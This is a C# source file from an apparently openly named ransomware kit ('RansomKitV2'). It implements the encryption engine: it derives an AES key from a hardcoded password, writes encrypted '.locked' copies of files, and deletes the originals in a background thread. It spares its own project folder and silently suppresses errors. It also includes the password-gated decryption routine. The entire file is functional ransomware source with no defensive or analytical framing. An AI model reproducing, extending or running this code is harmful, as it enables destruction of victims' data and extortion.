using System;
using System.Collections.Concurrent;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;

namespace RansomKitV2
{
    public static class CryptoEngine
    {
        public const string MasterKeyString = "billahaikillaleleuskadhila";
        public const string LockedExtension = ".locked";

        private static readonly byte[] Salt = new byte[]
        {
            0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
            0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0
        };

        private static byte[]? _sessionKey;
        private static readonly object _keyLock = new();
        private static readonly string _protectedProjectPath;

        private static readonly ConcurrentQueue<string> _deleteQueue = new();
        private static Thread? _deleteThread;
        private static bool _isRunning = false;

        static CryptoEngine()
        {
            string currentDir = AppContext.BaseDirectory;
            for (int i = 0; i < 5; i++)
            {
                if (string.IsNullOrEmpty(currentDir)) break;
                try
                {
                    if (Directory.EnumerateFiles(currentDir, "*.sln").Any() ||
                        Directory.EnumerateFiles(currentDir, "*.csproj").Any())
                    {
                        _protectedProjectPath = currentDir;
                        return;
                    }
                }
                catch { }
                var parent = Directory.GetParent(currentDir);
                if (parent == null) break;
                currentDir = parent.FullName;
            }
            _protectedProjectPath = AppContext.BaseDirectory;
        }

        private static void StartDeleteQueue()
        {
            if (_isRunning) return;
            _isRunning = true;
            _deleteThread = new Thread(() =>
            {
                while (_isRunning || !_deleteQueue.IsEmpty)
                {
                    if (_deleteQueue.TryDequeue(out var file))
                    {
                        try
                        {
                            File.SetAttributes(file, FileAttributes.Normal);
                            File.Delete(file);
                        }
                        catch { }
                    }
                    else
                    {
                        Thread.Sleep(10);
                    }
                }
            })
            { IsBackground = true, Priority = ThreadPriority.BelowNormal };
            _deleteThread.Start();
        }

        public static void StopDeleteQueue() => _isRunning = false;

        public static void PrimeSessionKey()
        {
            StartDeleteQueue();
            lock (_keyLock)
            {
                if (_sessionKey != null) return;
                using var pbkdf2 = new Rfc2898DeriveBytes(MasterKeyString, Salt, 100_000, HashAlgorithmName.SHA256);
                _sessionKey = pbkdf2.GetBytes(32);
            }
        }

        public static void ResetSessionKey()
        {
            lock (_keyLock)
            {
                if (_sessionKey != null)
                {
                    Array.Clear(_sessionKey, 0, _sessionKey.Length);
                    _sessionKey = null;
                }
            }
        }

        public static bool VerifyPassword(string password)
        {
            if (password != MasterKeyString) return false;
            using var pbkdf2 = new Rfc2898DeriveBytes(password, Salt, 100_000, HashAlgorithmName.SHA256);
            var testKey = pbkdf2.GetBytes(32);
            return testKey.Length == 32;
        }

        public static bool VerifyPassword(string password, string masterKeyHash) => VerifyPassword(password);

        public static void EncryptFile(string path)
        {
            if (path.StartsWith(_protectedProjectPath, StringComparison.OrdinalIgnoreCase)) return;
            if (path.EndsWith(LockedExtension, StringComparison.OrdinalIgnoreCase)) return;

            var key = _sessionKey;
            if (key == null) return;

            string targetPath = path + LockedExtension;
            var iv = new byte[16];
            RandomNumberGenerator.Fill(iv);

            using var aes = Aes.Create();
            aes.Key = key;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.IV = iv; // ALWAYS EXPLICITLY SET THE IV

            try
            {
                var info = new FileInfo(path);
                if (info.Length == 0) return;
                if (info.Length > DriveHelper.GetMaxSizeBytes(path)) return;

                // FAST PATH: < 1MB (In-Memory)
                if (info.Length <= 1024 * 1024)
                {
                    byte[] plaintext = File.ReadAllBytes(path);
                    byte[] ciphertext = aes.EncryptCbc(plaintext, iv);

                    byte[] finalData = new byte[16 + ciphertext.Length];
                    Buffer.BlockCopy(iv, 0, finalData, 0, 16);
                    Buffer.BlockCopy(ciphertext, 0, finalData, 16, ciphertext.Length);

                    File.WriteAllBytes(targetPath, finalData);
                }
                // STREAM PATH: > 1MB (Chunked)
                else
                {
                    const int bufferSize = 1024 * 1024; // 1MB chunks
                    var buffer = new byte[bufferSize];

                    using (var input = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete, bufferSize, FileOptions.SequentialScan))
                    using (var output = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None, bufferSize, FileOptions.SequentialScan))
                    {
                        // Write the 16-byte IV to the very start of the file
                        output.Write(iv, 0, iv.Length);

                        // The CryptoStream uses the aes object which already has the correct IV set
                        using var cryptoStream = new CryptoStream(output, aes.CreateEncryptor(), CryptoStreamMode.Write);

                        int bytesRead;
                        while ((bytesRead = input.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            cryptoStream.Write(buffer, 0, bytesRead);
                        }
                        cryptoStream.FlushFinalBlock();
                    }
                }

                _deleteQueue.Enqueue(path);
            }
            catch { }
        }

        public static void DecryptFile(string path)
        {
            if (!path.EndsWith(LockedExtension, StringComparison.OrdinalIgnoreCase)) return;
            if (!File.Exists(path)) return;

            var key = _sessionKey;
            if (key == null) return;

            string targetPath = path.Substring(0, path.Length - LockedExtension.Length);
            var iv = new byte[16];

            using var aes = Aes.Create();
            aes.Key = key;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            try
            {
                var info = new FileInfo(path);
                if (info.Length <= 16) return;

                // FAST PATH: < 1MB (In-Memory)
                if (info.Length <= 1024 * 1024)
                {
                    byte[] ciphertext = File.ReadAllBytes(path);
                    Array.Copy(ciphertext, 0, iv, 0, 16);

                    aes.IV = iv; // ALWAYS EXPLICITLY SET THE IV

                    byte[] plaintext = aes.DecryptCbc(ciphertext.AsSpan(16).ToArray(), iv);
                    File.WriteAllBytes(targetPath, plaintext);
                }
                // STREAM PATH: > 1MB (Chunked)
                else
                {
                    const int bufferSize = 1024 * 1024;
                    var buffer = new byte[bufferSize];

                    using (var input = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read, bufferSize, FileOptions.SequentialScan))
                    {
                        // Read the 16-byte IV from the header
                        if (input.Read(iv, 0, iv.Length) != iv.Length) return;

                        aes.IV = iv; // ALWAYS EXPLICITLY SET THE IV BEFORE DECRYPTING

                        using var cryptoStream = new CryptoStream(input, aes.CreateDecryptor(), CryptoStreamMode.Read);
                        using var output = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None, bufferSize, FileOptions.SequentialScan);

                        int bytesRead;
                        while ((bytesRead = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            output.Write(buffer, 0, bytesRead);
                        }
                    }
                }

                _deleteQueue.Enqueue(path);
            }
            catch { }
        }
    }
}